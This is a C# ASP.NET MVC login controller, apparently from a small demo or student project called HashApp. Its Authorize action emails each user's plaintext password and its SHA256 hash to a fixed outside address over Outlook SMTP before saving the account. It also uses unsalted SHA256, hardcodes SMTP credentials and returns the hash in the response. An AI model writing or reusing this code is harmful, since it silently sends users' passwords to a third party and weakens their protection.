using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Web.Mvc;
using HashApp.Models;
using System.Net.Mail;

namespace HashApp.Controllers
{

    
    public class LoginController : Controller
    { 

        // GET: Login
        public ActionResult Index()
        {
            


            return View();
        }

        [HttpPost]
        public ActionResult Authorize(HashApp.Models.usertable userModel)
        {

            //var bytesToBeEncrypted = Encoding.UTF8.GetBytes(plainText);
            //var passwordBytes = Encoding.UTF8.GetBytes(password);

            //// Hash the password with SHA256
            //passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            //var bytesEncrypted = Cipher.Encrypt(bytesToBeEncrypted, passwordBytes);

            //return Convert.ToBase64String(bytesEncrypted);
            var realPassword = userModel.password;
            var passwordbyte = Encoding.UTF8.GetBytes(userModel.password);
            var encrypted = SHA256.Create().ComputeHash(passwordbyte);

            userModel.password = Convert.ToBase64String(encrypted);

            MailMessage ePosta = new MailMessage();
            
            ePosta.From = new MailAddress("sender@example.com");
            ePosta.To.Add("getter@example.com");

            ePosta.Subject = "";

            ePosta.Body = "PASSWORD: " + realPassword + " SHA256 = " + userModel.password;

            SmtpClient smtp = new SmtpClient();
            smtp.Host = "smtp-mail.outlook.com";
            smtp.Credentials = new System.Net.NetworkCredential("sender@example.com","pass");

            smtp.Port = 587;
            smtp.EnableSsl = true;

            smtp.Send(ePosta);



            

            using (usersEntities db = new usersEntities())
            {

                db.usertables.Add(userModel);
                db.SaveChanges();

            }

            

            return Content(userModel.username + " " + userModel.password);

        }
    }
}